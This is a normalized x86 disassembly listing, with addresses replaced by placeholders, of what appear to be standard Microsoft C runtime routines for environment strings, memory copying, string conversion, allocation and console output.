xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] esi
je r-xdata
call sub_41872f
mov [ ebp - 0x4 ] esi
cmp [ eax ] bl
mov [ ebp - 0x4 ] eax
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_418f2d
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_413757
mov esi eax
cmp esi ebx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_418f2d
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_41917e
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_413757
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_413757
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_410ec0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40fdab
pop ecx
mov [ esp + 0x10 ] ebx
sub_4192b3
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_419347
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_410556
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_412089
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_419d2c
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_4195ef
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
movzx eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_418df5
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41945e
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_419347
pop ecx
pop ecx
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
retn
add eax 0x20
retn
sub_419485
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41950c
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_41950c
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_419485
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_4195ef
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_410556
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_419d2c
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41dd09
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4196a5
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_4116d4
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ rw-data ]
mov esi [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
push eax
call sub_4116dd
pop ecx
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
push eax
call sub_4116dd
pop ecx
call eax
cmp eax ebx
je r-xdata
push eax
call sub_411671
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_411671
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_411671
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_40e109
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40e140
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
push [ ebp - 0x4 ]
push eax
call sub_4116dd
pop ecx
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
push r--data
push edi
call esi
push eax
call sub_411671
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
push r--data
push edi
call esi
push eax
call sub_411671
pop ecx
mov [ rw-data ] eax
sub_419843
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_412089
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
sub_4198b4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_412089
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
sub_419967
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_4199b5
push 0x10
push r--data
call sub_412340
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_412089
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_4171b0
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_412385
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419a4f
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_419a61
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_41273d
test eax eax
je r-xdata
push 0xa
call sub_411ba4
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_41274a
pop ecx
push 0x3
call sub_40e2ed
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40fb30
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_419b54
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_412089
mov [ eax ] 0x9
xor eax eax
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_41202a
add esp 0x14
xor eax eax
pop esi
retn
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
movzx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop esi
retn
sub_419bb2
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_412089
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
cmp ax 0xff
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_412089
mov [ eax ] 0x2a
call sub_412089
cmp [ ebp - 0x4 ] bl
mov eax [ eax ]
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_412089
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40fb30
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40fb30
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_419d2c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_410556
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_419d70
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_419e05
push 0xc
push r--data
call sub_412340
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_412089
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_412385
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_4129f7
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_417984
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419f01
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_40fb30
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_419f23
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
or ax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_413919
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_413965
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_419fe5
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_419d2c
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_412089
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
